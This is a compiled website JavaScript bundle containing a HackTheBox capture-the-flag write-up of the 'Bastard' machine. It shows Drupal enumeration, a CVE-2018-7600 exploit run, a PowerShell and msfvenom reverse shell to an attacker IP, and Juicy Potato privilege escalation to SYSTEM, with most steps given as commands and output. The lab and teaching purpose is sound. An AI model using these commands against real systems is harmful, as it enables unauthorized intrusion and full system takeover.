"use strict";(self.webpackChunkmy_writeups=self.webpackChunkmy_writeups||[]).push([[5951],{782:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>p,frontMatter:()=>i,metadata:()=>s,toc:()=>h});const s=JSON.parse('{"id":"HackTheBox/bastard","title":"Bastard","description":"Enumeration","source":"@site/writeups/HackTheBox/bastard.md","sourceDirName":"HackTheBox","slug":"/HackTheBox/bastard","permalink":"/writeups/HackTheBox/bastard","draft":false,"unlisted":false,"editUrl":"https://github.com/xffsec/xffsec.github.io/tree/main/writeups/HackTheBox/bastard.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialsSidebar","previous":{"title":"\ud83d\udce6 Hackthebox","permalink":"/writeups/category/-hackthebox-4"},"next":{"title":"Blue","permalink":"/writeups/HackTheBox/blue"}}');var r=t(4848),a=t(8453);const i={},l="Bastard",o={},h=[{value:"Enumeration",id:"enumeration",level:2},{value:"shell as iusr",id:"shell-as-iusr",level:2},{value:"shell as nt authority\\system",id:"shell-as-nt-authoritysystem",level:2}];function c(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"bastard",children:"Bastard"})}),"\n",(0,r.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,r.jsx)(n.p,{children:"Starting with a nmap scan I find three open ports"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$ sudo nmap -sS -p- --open -n -Pn --min-rate=5000 10.10.10.9 -oG allPorts -vvvv\nPORT      STATE SERVICE REASON\n80/tcp    open  http    syn-ack ttl 127\n135/tcp   open  msrpc   syn-ack ttl 127\n49154/tcp open  unknown syn-ack ttl 127\n"})}),"\n",(0,r.jsx)(n.p,{children:"Visiting the port 80 I find a drupal login panel"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Desktop View",src:t(5997).A+"",width:"891",height:"703"})}),"\n",(0,r.jsx)(n.p,{children:"doing a curl to the changelog.txt I'm able to enumerate the version which in this case is 7.54"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$ curl -s -X GET http://10.10.10.9/CHANGELOG.txt  | head\n\nDrupal 7.54, 2017-02-01\n-----------------------\n"})}),"\n",(0,r.jsx)(n.h2,{id:"shell-as-iusr",children:"shell as iusr"}),"\n",(0,r.jsxs)(n.p,{children:["searching for some exploits I find this ",(0,r.jsx)(n.a,{href:"https://github.com/pimps/CVE-2018-7600",children:"CVE-2018-7600"})," that allows me to get remote command execution on the machine"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$ python drupa7-CVE-2018-7600.py -c 'whoami' http://10.10.10.9/\n[*] Triggering exploit to execute: whoami\nnt authority\\iusr\n"})}),"\n",(0,r.jsxs)(n.p,{children:["To get a stable shell I use the base64 powershell reverse shell from ",(0,r.jsx)(n.a,{href:"https://www.revshells.com/",children:"revshells"})," I start a nc listener on port 9001 and receive the connection"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:"$ python drupa7-CVE-2018-7600.py -c 'powershell -e JABjAGwAa...' http://10.10.10.9/\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"$ rlwrap nc -lnvp 9001\nlistening on [any] 9001 ...\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.10.9] 51840\n\nPS C:\\inetpub\\drupal-7.54> whoami\nnt authority\\iusr\nPS C:\\inetpub\\drupal-7.54> \n"})}),"\n",(0,r.jsx)(n.p,{children:"Enumerating privileges I see that the seimpersonate privilege is enabled which might allow me to use a juicy potato or a similar exploit to elevate privileges"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"PS C:\\inetpub\\drupal-7.54> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name          Description                               State  \n======================= ========================================= =======\nSeChangeNotifyPrivilege Bypass traverse checking                  Enabled\nSeImpersonatePrivilege  Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege Create global objects                     Enabled\nPS C:\\inetpub\\drupal-7.54> \n"})}),"\n",(0,r.jsx)(n.h2,{id:"shell-as-nt-authoritysystem",children:"shell as nt authority\\system"}),"\n",(0,r.jsx)(n.p,{children:"I create a shell.exe file with msfvenom that will give me a reverse shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -f exe -o shell.exe\n"})}),"\n",(0,r.jsx)(n.p,{children:"I download juicy potato and the shell.exe executable files into the target machine"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:"PS C:\\windows\\temp\\x> copy \\\\10.10.14.13\\smbfolder\\shell.exe . \nPS C:\\windows\\temp\\x> copy \\\\10.10.14.13\\smbfolder\\jp.exe .\n"})}),"\n",(0,r.jsx)(n.p,{children:"I start another nc listener on port 9001 and then I try to run jp.exe with the program shell.exe but it fails"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sh",children:"PS C:\\windows\\temp\\x> .\\jp.exe -t * -l 1337 -p .\\shell.exe \nTesting {4991d34b-80a1-4291-83b6-3328366b9097} 1337\nCOM -> recv failed with error: 10038\n"})}),"\n",(0,r.jsxs)(n.p,{children:["The reason is that the clsid is wrong so I look for a valid one ",(0,r.jsx)(n.a,{href:"https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise",children:"here"}),' I retry the exploit two times until it gives an "OK" response']}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'PS C:\\windows\\temp\\x> .\\jp.exe -t * -l 1337 -p ".\\shell.exe" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"\nTesting {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 1337\n...........................................\nPS C:\\windows\\temp\\x> .\\jp.exe -t * -l 1337 -p ".\\shell.exe" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"\nTesting {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 1337\n....\n[+] authresult 0\n{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\\SYSTEM\n\n[+] CreateProcessWithTokenW OK\nPS C:\\windows\\temp\\x> \n'})}),"\n",(0,r.jsx)(n.p,{children:"and finally I receive a shell as nt authority\\system"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"$ rlwrap nc -lnvp 9001\nlistening on [any] 9001 ...\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.10.9] 63808\nMicrosoft Windows [Version 6.1.7600]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32>whoami\nwhoami\nnt authority\\system\n\nC:\\Windows\\system32>\n"})})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(c,{...e})}):c(e)}},5997:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/drupal_login_1-9683abd52ad6732015f3c8f6a9db3476.png"},8453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>l});var s=t(6540);const r={},a=s.createContext(r);function i(e){const n=s.useContext(a);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);